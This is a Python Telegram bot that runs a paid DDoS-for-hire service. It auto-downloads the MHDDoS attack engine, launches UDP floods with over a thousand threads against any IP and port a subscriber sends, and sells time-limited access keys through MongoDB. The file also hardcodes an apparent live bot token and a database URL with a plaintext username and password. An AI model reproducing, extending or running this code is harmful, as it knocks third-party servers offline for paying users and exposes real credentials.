import telebot
import subprocess
import threading
import time
import random
import os
from telebot import types
from datetime import datetime, timedelta
from pymongo import MongoClient

# --- CONFIG ---
TOKEN = '8676988617:AAF8sRBKuScBqbWP23ggZRrerAGabu0dfCw'
# Yahan maine tera password aur URL fix kar diya hai
MONGO_URL = "mongodb+srv://riderbhai:riderbhai321@cluster0.yvrweuu.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
ADMIN_ID = 6075779781 
bot = telebot.TeleBot(TOKEN)

# MongoDB Setup
try:
    client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
    db = client['RiderBot']
    users_col = db['users']
    keys_col = db['keys']
    client.admin.command('ping')
    print("✅ MongoDB Connected Successfully!")
except Exception as e:
    print(f"❌ MongoDB Connection Error: {e}")

# Engine Setup (Auto Download MHDDoS)
if not os.path.exists("MHDDoS"):
    print("📡 Downloading Attack Engine...")
    os.system("git clone https://github.com/Grizzly-Anis/MHDDoS-Lite.git MHDDoS")

# --- HELPERS ---
def get_progress_bar(percent):
    bar_length = 10
    filled = int(percent / 10)
    return "🔵" * filled + "⚪" * (bar_length - filled)

# --- ATTACK ENGINE ---
def run_attack(ip, port, duration, chat_id, message_id, username):
    threads = random.randint(1100, 1600)
    command = f"python3 start.py UDP {ip} {port} {threads} {duration}"
    
    try:
        process = subprocess.Popen(command, shell=True, cwd="./MHDDoS")
        start_time = time.time()
        
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            remaining = int(duration - elapsed)
            percent = min(100, int((elapsed / duration) * 100))
            bar = get_progress_bar(percent)
            
            try:
                bot.edit_message_text(
                    chat_id=chat_id, message_id=message_id,
                    text=(f"⚡ **VVIP ATTACK ACTIVE** ⚡\n"
                          f"━━━━━━━━━━━━━━━━━━━━━━\n"
                          f"👤 **User:** `@{username}`\n"
                          f"🎯 **Target:** `{ip}:{port}`\n"
                          f"⏳ **Time:** `{remaining}s` / `{duration}s`\n"
                          f"📊 **Power:** `{bar} {percent}%` \n"
                          f"🛡️ **Anti-Ban:** `BYPASS ON ✅`\n"
                          f"━━━━━━━━━━━━━━━━━━━━━━"),
                    parse_mode="Markdown"
                )
            except: pass
            time.sleep(4)
        
        process.terminate()
        bot.send_message(chat_id, f"🔥 **SERVER DOWN!**\n\nTarget `{ip}` was successfully frozen. ✅")
    except Exception as e:
        print(f"Error: {e}")

# --- HANDLERS ---
@bot.message_handler(commands=['start'])
def welcome(m):
    user_id = m.from_user.id
    user_data = users_col.find_one({"user_id": user_id})
    
    if (user_data and datetime.strptime(user_data['expiry'], '%Y-%m-%d %H:%M:%S') > datetime.now()) or user_id == ADMIN_ID:
        bot.send_message(m.chat.id, f"👑 **Welcome Legend @{m.from_user.username}!**\nSystem ready hai.", reply_markup=main_menu())
    else:
        bot.send_message(m.chat.id, f"🚫 **Access Denied!**\nContact Admin for Key.")

@bot.message_handler(commands=['genkey'])
def gen(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        days = int(m.text.split()[1])
        key = f"VVIP-{random.randint(1000, 9999)}"
        keys_col.insert_one({"key": key, "days": days})
        bot.reply_to(m, f"🔑 **KEY:** `/redeem {key}`\n**Validity:** {days} Days")
    except: bot.reply_to(m, "Format: /genkey 1")

@bot.message_handler(commands=['redeem'])
def redeem(m):
    user_id = m.from_user.id
    args = m.text.split()
    if len(args) < 2:
        bot.reply_to(m, "❌ Key toh dalo! Format: `/redeem VVIP-1234`")
        return
        
    key_text = args[1]
    key_data = keys_col.find_one({"key": key_text})
    
    if key_data:
        days = key_data['days']
        expiry = datetime.now() + timedelta(days=days)
        users_col.update_one({"user_id": user_id}, {"$set": {"expiry": expiry.strftime('%Y-%m-%d %H:%M:%S')}}, upsert=True)
        keys_col.delete_one({"key": key_text})
        bot.reply_to(m, f"🎉 Access Granted for {days} Days!")
    else:
        bot.reply_to(m, "❌ Invalid Key!")

def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('🚀 VVIP Attack', '👤 My Info', '🔑 Redeem Key')
    return markup

@bot.message_handler(commands=['attack'])
def handle_attack(m):
    user_id = m.from_user.id
    user_data = users_col.find_one({"user_id": user_id})
    if not (user_id == ADMIN_ID or (user_data and datetime.strptime(user_data['expiry'], '%Y-%m-%d %H:%M:%S') > datetime.now())):
        bot.reply_to(m, "❌ No Active Subscription!")
        return
    try:
        p = m.text.split()
        if len(p) < 4:
            bot.reply_to(m, "❌ Use: `/attack IP PORT TIME`")
            return
        sent = bot.reply_to(m, "📡 **Bypassing...**")
        threading.Thread(target=run_attack, args=(p[1], int(p[2]), int(p[3]), m.chat.id, sent.message_id, m.from_user.username)).start()
    except: pass

bot.infinity_polling()
